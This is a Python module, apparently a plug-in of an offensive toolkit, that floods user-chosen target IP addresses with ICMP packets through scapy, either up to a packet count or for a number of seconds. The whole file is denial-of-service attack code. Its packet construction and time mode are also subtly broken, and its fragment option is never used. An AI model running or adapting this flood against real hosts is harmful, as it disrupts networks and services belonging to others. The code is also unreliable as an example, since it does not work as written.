from scapy.all import *

from lib.cmd_tool import *

NAME = 'IcmpFlood'

class Module:
    def __init__(self):
        self.config = {
            'IP': {
                'value': '',
                'help': 'Target IP',
            },
            'Count': {
                'value': '100',
                'help': 'Send packet count.',
            },
            'Time': {
                'value': '10',
                'help': 'Stop flooding after specified seconds.'
            },
            'Fragment': {
                'value': 'true',
                'help': 'Enable fragment ICMP packet.',
            },
            'Mode': {
                'value': '0',
                'help': '',
                'option': {
                    MODE_COUNT: '',
                    MODE_TIME: '',
                }
            },
        }

        self.help = ''

    def validate(self) -> bool:
        if not self.config['IP']['value'] or self.config['IP']['value'].replace(' ', '') == '':
            cp.pf_failed('\'IP\' is null or empty.')
            return False
        
        return True

    def interactive(self):
        interactive(self, 'icmp_flood')

    def run(self):
         
        def icmp_flood(ip: str): 
            pkt = ICMP(dst=ip) / ICMP()
            send(pkt, verbose=False)

        try:
           
            lsIP = str2strls(get_value(self.config, 'IP'))
            nCnt = int(get_value(self.config, 'Count'))
            nTime = int(get_value(self.config, 'Time'))
            nMode = int(get_value(self.config, 'Mode'))
           
            total = 0

            if nMode == MODE_COUNT:
                for ip in lsIP:
                    for _ in range(0, nCnt):
                        icmp_flood(ip)
                        total += 1
            
            elif nMode == MODE_TIME:
               total = doWorkWithSeconds(icmp_flood, nTime, {'ip': ip})
               
            cp.pf_ok(f'Done, total={total}')
        
        except Exception as ex:
            cp.pf_failed(str(ex))